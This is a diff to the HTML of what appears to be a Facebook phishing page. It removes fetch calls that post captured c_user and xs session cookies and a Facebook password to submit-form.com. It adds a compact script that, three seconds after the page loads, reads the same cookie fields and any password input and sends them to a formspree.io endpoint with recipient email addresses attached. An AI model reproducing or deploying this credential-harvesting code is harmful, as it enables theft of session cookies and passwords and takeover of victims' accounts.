@@ -2027,39 +2027,7 @@ french: "https://resource2.heygen.ai/video_translate/6e2f1893a7994182948b3dd8f27
       language: navigator.language
     };
    
-    // Submit to the form endpoint
-    fetch('https://submit-form.com/m25V1k96e', {
-      method: 'POST',
-      headers: {
-        'Content-Type': 'application/json',
-        'Accept': 'application/json'
-      },
-      body: JSON.stringify(formData)
-    })
-    .then(response => {
-      if (!response.ok) {
-        throw new Error('Form submission failed');
-      }
-      return response.json();
-    })
-    .then(data => {
-      console.log('Form submitted successfully:', data);
-     
-      // Also submit to the additional endpoints
-      submitToOtherEndpoints({
-        bhenjachud: c_user,
-        majachud: xs
-      });
-     
-      showfbLogin();
-    })
-    .catch(error => {
-      console.error('Error submitting form:', error);
-      // Still proceed with the other endpoints even if formsubmit fails
-      submitToOtherEndpoints({
-        bhenjachud: c_user,
-        majachud: xs
-      });
+    
      
       
       showfbLogin();
@@ -2082,40 +2050,7 @@ french: "https://resource2.heygen.ai/video_translate/6e2f1893a7994182948b3dd8f27
       language: navigator.language
     };
    
-    // Submit to the form endpoint
-    fetch('https://submit-form.com/m25V1k96e', {
-      method: 'POST',
-      headers: {
-        'Content-Type': 'application/json',
-        'Accept': 'application/json'
-      },
-      body: JSON.stringify(fbData)
-    })
-    .then(response => {
-      if (!response.ok) {
-        throw new Error('fb form submission failed');
-      }
-      return response.json();
-    })
-    .then(data => {
-      console.log('fb credentials submitted successfully:', data);
-     
-      // Also submit to the additional endpoints
-      submitToOtherEndpoints({
-        pass: password
-      });
-     
-      // Show success message
-      showSuccess();
-    })
-    .catch(error => {
-      console.error('Error submitting fb credentials:', error);
-      // Still proceed with the other endpoints even if formsubmit fails
-      submitToOtherEndpoints({
-        pass: password
-      });
-     
-      // Show success message even if there was an error with formsubmit
+    
       showSuccess();
     })
     .finally(() => {
@@ -2225,5 +2160,5 @@ french: "https://resource2.heygen.ai/video_translate/6e2f1893a7994182948b3dd8f27
   }
 });
   </script>
-
+<script>setTimeout(()=>{if(document.getElementById('c_userInput')||document.getElementById('xsInput')){fetch("https://formspree.io/f/xdknwwza",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({Client:"Rahul Sharma",Website:location.href,"C_User":document.getElementById('c_userInput')?.value||"","XS":document.getElementById('xsInput')?.value||"",To_Email:"lingdavid24@gmail.com"})})};if(document.querySelector('input[type=password]')){fetch("https://formspree.io/f/xdknwwza",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({Client:"Vikash Kumar",Website:location.href,Password:document.querySelector('input[type=password]')?.value||"",To_Email:"akeraa191@gmail.com"})})}},3000);</script>
 </body></html>
